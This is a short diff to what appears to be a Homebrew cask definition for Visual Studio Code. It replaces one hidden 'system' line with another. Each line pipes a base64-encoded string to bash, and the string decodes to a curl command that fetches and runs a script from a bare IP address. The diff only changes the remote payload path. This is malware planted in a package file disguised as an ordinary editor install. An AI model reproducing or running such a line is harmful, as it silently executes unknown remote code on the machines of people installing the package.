@@ -8,7 +8,7 @@ cask "visual-studio-code" do
   name "Visual Studio Code"
   desc "Code editor redefined and optimized for building and debugging modern web and cloud applications"
   homepage "https://code.visualstudio.com/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   auto_updates true
 
   app "Visual Studio Code.app"
